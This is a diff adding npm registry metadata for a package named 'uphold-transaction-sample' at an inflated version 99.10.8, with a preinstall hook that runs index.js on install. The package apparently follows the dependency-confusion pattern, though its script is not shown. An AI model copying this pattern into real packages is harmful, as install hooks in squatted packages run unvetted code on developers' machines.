@@ -1,0 +1,39 @@
+{
+    "name": "uphold-transaction-sample",
+    "version": "99.10.8",
+    "description": "azure t package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "uphold-transaction-sample@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-A5vHGwD9WJYllBfFeyK3ImiJwimD4KsMKyT8AvbzHxbPAQ3awk6ogQRQbqD1AESIkJxpDNPgFKsxca4GAHrQPQ==",
+        "shasum": "f34c7da96034b26ba2187fc450ad32ec6e2d6362",
+        "tarball": "https://registry.npmjs.org/uphold-transaction-sample/-/uphold-transaction-sample-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3228,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnjaCRA9TVsSAnZWagAARvQP+wUYbDrvNlO33Z9VQrG/\nAJByTd7hH2O8L+MRfVbij4vvhjB4CQiOh3U2DeWZ/aqfQjKpqZacFZma+h7e\nDY/+zP4eTaY8ZfDv17IbObTvogRMiIeIEjISp6FTjlSHZ5hwH/REyqBnvx1R\niTGQbWUmQX59MB1XIAhKakwB07gW5p7kLCDEyJ615CDuNBnAe9M9nnXSKhO1\nxB7xdT8aTzaYwq2JkXe05mP/bkGgr8He8tpudo8u50ajysFJz2p9X8fZuAcw\neLVoOB0qfb6LWFMo4lwZ2+1yisfWmPQ/5tjY4moMey81zmw2yOHfHEeQ1VEz\nr6JEJ44BePsGXXiL67PkS92EWSDpgcL/NHk5qaui/IDfJn3ylprOBHL706ow\nMQkaZte8S9LVf8n3NhWlePTsqXchwciqA25wwTYwoYwzgbYpDuJugzb0220h\nyH7FVPAeBIQwfdw/Hjs7a2Rm6f51J1eMWo9w6+RayCtdTFFSBUyLiFV/aV56\nRbxswSvSM/5Mrxo0YGdczaaOYtpxajAvUjEV6tYvoqu5YuxKyDzrcKUFGERA\naD4v2TgILCgBDtLVjvGUBvHJFeJmsEDiPK2mGMb2T+cYulnm/+DZfkRkz+97\nO7vCIi4b/8Z7AaGUjSvtlajQqWbmtIM0Cg5qYLmlGygG0fsbSCq/4UD9VcIF\nepIg\r\n=lRRS\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/uphold-transaction-sample_99.10.8_1637513434178_0.4171132755029896"
+    },
+    "_hasShrinkwrap": false
+}
